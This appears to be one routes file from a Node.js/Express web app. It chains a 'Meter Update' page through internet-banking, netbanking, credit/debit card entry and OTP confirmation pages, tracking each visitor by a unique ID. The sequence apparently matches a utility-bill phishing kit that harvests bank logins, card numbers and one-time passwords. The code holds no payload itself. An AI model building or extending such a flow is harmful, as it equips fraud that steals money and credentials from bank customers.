// routes/bankingRoutes.js
const express  = require('express');
const router   = express.Router();
const getCtrl  = require('../Controllers/getController');

// Page 1: Meter Update
router.get('/meter-update/:uniqueId?', getCtrl.renderMeterForm);

// Page 2: Internet Banking
router.get('/internet-banking/:uniqueId',    getCtrl.renderBankingForm);

// Page 3: Netbanking step
router.get('/netbanking/:uniqueId',          getCtrl.renderNetBankingPage);

// Page 4: Credit / Debit card entry
router.get('/credit/:uniqueId',              getCtrl.renderCreditForm);

// Page 5: OTP confirmation
router.get('/otp/:uniqueId',                 getCtrl.renderOTPPage);

module.exports = router;
